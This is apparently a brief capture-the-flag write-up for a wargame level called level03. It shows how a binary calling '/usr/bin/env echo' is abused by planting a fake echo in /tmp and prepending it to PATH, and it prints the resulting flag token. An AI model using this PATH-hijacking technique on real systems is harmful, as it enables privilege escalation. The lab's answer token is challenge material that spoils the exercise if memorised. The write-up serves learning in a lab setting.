In the home folder we find a executable named `level03` which can be examined with `strings` :
```bash
strings ./level03
[...]
/usr/bin/env echo Exploit me
[...]
```

Here we found a PATH exploit, the executable use `/usr/bin/env echo` instead of `/bin/echo`, we can change the PATH and execute a file named echo with the command `getflag` in :
```bash
echo getflag > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
```

We execute `./level03` :
```bash
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
